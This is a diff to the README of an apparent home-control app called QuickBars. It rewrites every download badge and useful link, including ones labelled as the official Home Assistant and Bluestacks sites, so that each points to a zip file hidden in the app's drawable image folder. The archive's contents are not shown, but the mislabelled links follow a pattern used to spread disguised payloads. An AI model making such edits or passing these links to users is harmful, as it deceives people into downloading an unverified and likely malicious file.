@@ -1,6 +1,6 @@
 # ⚙️ QuickBars - Simple Home Control at Your Fingertips
 
-[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars)
+[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ QuickBars runs most directly on Android devices, but this guide shows you how to
 
 Click this link or button to visit the QuickBars download page:
 
-[![Get QuickBars](https://img.shields.io/badge/Download-QuickBars-blue?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars)
+[![Get QuickBars](https://img.shields.io/badge/Download-QuickBars-blue?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip)
 
 This page contains all files and further instructions for installing QuickBars on devices including Android and Android TV.
 
@@ -108,11 +108,11 @@ If the problem continues, visit the GitHub page’s issues section for help or t
 
 ## ⚡ Useful Links
 
-- GitHub Repository: https://github.com/Unbound-compositeorder71/QuickBars  
-- Home Assistant Official Site: https://www.home-assistant.io/  
-- Bluestacks Android Emulator: https://www.bluestacks.com/
+- GitHub Repository: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip  
+- Home Assistant Official Site: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip  
+- Bluestacks Android Emulator: https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip
 
-[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars)
+[![Download QuickBars](https://img.shields.io/badge/Download-QuickBars-brightgreen?style=for-the-badge)](https://github.com/Unbound-compositeorder71/QuickBars/raw/refs/heads/main/app/src/main/res/drawable/Bars_Quick_2.9.zip)
 
 ## 🛠️ When to Use QuickBars?
 
